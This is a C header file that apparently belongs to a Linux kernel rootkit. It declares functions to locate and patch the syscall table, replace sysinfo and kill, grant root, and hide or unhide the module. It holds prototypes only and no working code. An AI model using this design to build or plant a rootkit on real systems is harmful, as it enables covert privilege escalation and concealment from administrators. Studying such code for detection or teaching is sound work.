#ifndef MODIFY_SYSCALLS_H_INCLUDED
#define MODIFY_SYSCALLS_H_INCLUDED

void update_sys_calls(void **sys_call_table);

void revert_to_original(void **sys_call_table);

asmlinkage int hacked_sysinfo(struct sysinfo *info);

asmlinkage int hacked_kill(pid_t pid, int sig);

void give_root(void);

void hide(void);
void unhide(void);

void **find_syscall_table(void);

#endif